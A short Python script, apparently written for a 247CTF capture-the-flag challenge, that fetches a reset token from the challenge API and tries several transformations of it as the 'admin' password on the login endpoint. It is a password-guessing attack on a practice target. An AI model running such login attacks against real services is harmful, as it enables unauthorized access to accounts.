#!/usr/bin/env python3
import requests
import hashlib

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    return resp.json()

token = get_token()
print(f"Token: {token}\n")

# Probar diferentes transformaciones del token
tests = [
    ("Token mismo", token),
    ("Token reverso", token[::-1]),
    ("MD5 del token", hashlib.md5(token.encode()).hexdigest()),
    ("SHA256 del token", hashlib.sha256(token.encode()).hexdigest()[:32]),
    ("Primera mitad duplicada", token[:16] + token[:16]),
    ("Segunda mitad duplicada", token[16:] + token[16:]),
]

for desc, password in tests:
    result = try_password("admin", password, token)
    print(f"{desc}:")
    print(f"  Password: {password}")
    print(f"  Result: {result}")
    print()
